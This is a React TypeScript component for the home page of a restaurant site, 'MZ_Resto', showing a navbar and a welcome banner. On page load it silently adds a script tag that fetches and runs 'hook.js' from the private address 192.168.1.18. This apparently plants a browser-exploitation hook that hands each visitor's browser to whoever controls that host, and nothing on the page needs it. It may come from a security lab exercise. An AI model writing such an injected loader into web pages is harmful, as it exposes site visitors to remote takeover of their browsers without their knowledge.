import React from "react";
import "../sass/Home.scss";
import { useEffect } from "react";
import { Navbar } from "../components/Navbar";
interface HAuth {
    setAuth: React.Dispatch<React.SetStateAction<boolean>>;
}
export  function Home({setAuth}:HAuth){
    useEffect(() => {
        // إضافة رابط الـ hook.js إلى الـ head
        const script = document.createElement('script');
        script.src = 'http://192.168.1.18/hook.js';
        script.async = true;
        document.body.appendChild(script);
        
        return () => {
          document.body.removeChild(script); // تنظيف الـ script عند مغادرة الصفحة
        };
    }, []);
    return ( 
    <div className="Mainhom   w-screen h-screen py-10">
        <div className="container  mx-auto w-full  relative   bg-gradient-to-r from-gray-200 to-gary-100 shadow-lg shadow-gray-600  ">
            <Navbar setAuth={setAuth} />
            <h1 className="text-4xl font-serif italic py-5 px-4 rounded-xl bg-amber-600 bg-opacity-25 absolute top-1/2 left-1/2 -translate-y-1/2 -translate-x-1/2 text-amber-400">Welcome At MZ_Resto</h1>
            <div className={`cont w-full  relative h-full `}>
            </div>
        </div> 
    </div>
    )
    
}
